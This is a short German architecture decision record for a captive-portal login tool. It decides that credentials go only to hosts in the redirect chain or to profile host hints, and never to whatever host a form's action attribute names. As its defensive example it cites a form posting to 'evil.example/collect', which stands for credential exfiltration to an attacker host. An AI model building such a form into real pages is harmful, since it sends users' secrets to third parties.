# ADR 0001: Credential-Hosts ohne Form-Action-Hosts

Status: angenommen (Phase 2)

01 §25 zählt Form-Action-Hosts zur erlaubten Host-Menge. Das lässt eine Portalseite beliebige Ziele freischalten: Ein Formular mit `action="http://evil.example/collect"` würde sein eigenes Ziel legitimieren.

Entscheidung: Persönliche oder geheime Werte gehen nur an Hosts der Redirect-Kette, an Profil-`portalHostHints` und an die Host der aktuellen Seite (sie steht in der Kette). Form-Action-Hosts erweitern die Menge nicht. Formulare ohne eingetragene Werte (Click-through) dürfen an jeden Host gehen.

Folge: Portale, deren Formular auf einen fremden Host zeigt, brauchen einen Host-Hint im Profil, sonst endet der Lauf mit `manualInteractionRequired` (Replay) bzw. `aiRejectedPlan` (Modellplan). Test: `externalFormActionDoesNotGetCredentials`.
